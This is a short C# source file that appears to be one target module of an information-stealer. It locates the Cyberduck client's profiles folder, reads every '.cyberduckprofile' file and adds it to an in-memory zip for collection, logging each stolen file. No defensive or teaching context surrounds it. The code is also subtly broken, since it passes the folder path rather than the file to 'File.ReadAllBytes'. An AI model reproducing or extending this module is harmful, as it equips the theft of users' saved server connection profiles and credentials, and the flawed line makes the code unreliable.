using Helper.Data;
using System;
using System.IO;

namespace Targets.Applications
{
	public class CyberDuck : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
	    if (!Directory.Exists(path))
	      return;
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	    counterApplications.Name = nameof (CyberDuck);
	    foreach (string file in Directory.GetFiles(path))
	    {
	      if (file.EndsWith(".cyberduckprofile"))
	      {
	        string entryPath = "CyberDuck\\" + Path.GetFileName(file);
	        zip.AddFile(entryPath, File.ReadAllBytes(path));
	        counterApplications.Files.Add($"{file} => {entryPath}");
	      }
	    }
	    counter.Applications.Add(counterApplications);
	  }
	}
}
